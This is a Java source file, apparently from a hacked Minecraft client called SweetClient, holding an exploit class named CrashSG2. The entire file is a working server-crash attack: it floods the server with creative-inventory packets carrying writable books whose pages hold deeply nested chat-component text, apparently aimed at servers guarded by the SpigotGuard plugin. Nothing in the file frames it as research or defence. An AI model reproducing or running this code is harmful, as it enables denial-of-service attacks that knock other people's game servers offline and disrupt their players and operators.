package SweetClient.exploits.impl;

import SweetClient.exploits.Exploit;
import SweetClient.exploits.ExploitInfo;
import SweetClient.helpers.ChatHelper;
import SweetClient.mods.notifications.Notification;
import SweetClient.mods.notifications.NotificationManager;
import SweetClient.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

@ExploitInfo(
   name = "SG2"
)
public class CrashSG2 extends Exploit {
   @Override
   public void execute(Object... var1) {
      int var2 = var1[0];
      long var3 = System.currentTimeMillis();
      ChatHelper.printMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), var1[0]));
      NotificationManager.show(new Notification(NotificationType.INFO, "SweetClient", "SpigotGuard has left the game!", 4));

      for(int var5 = 0; var5 < var2; ++var5) {
         for(int var6 = 0; var6 < 12000; ++var6) {
            NBTTagCompound var7 = new NBTTagCompound();
            NBTTagList var8 = new NBTTagList();
            StringBuilder var9 = new StringBuilder();
            var9.append("{");
            short var10 = 833;

            for(int var11 = 0; var11 < var10; ++var11) {
               var9.append("extra:[{");
            }

            for(int var13 = 0; var13 < var10; ++var13) {
               var9.append("text:ſ}],");
            }

            var9.append("text:ſ}");
            var8.appendTag(new NBTTagString(String.valueOf(var9)));
            var7.setString("author", mc.thePlayer.getName());
            var7.setString("title", "SweetClient");
            var7.setByte("resolved", (byte)1);
            var7.setTag("pages", var8);
            ItemStack var12 = new ItemStack(Items.writable_book);
            var12.setTagCompound(var7);
            Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C10PacketCreativeInventoryAction(1, var12));
         }
      }

      ChatHelper.printMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - var3));
   }
}
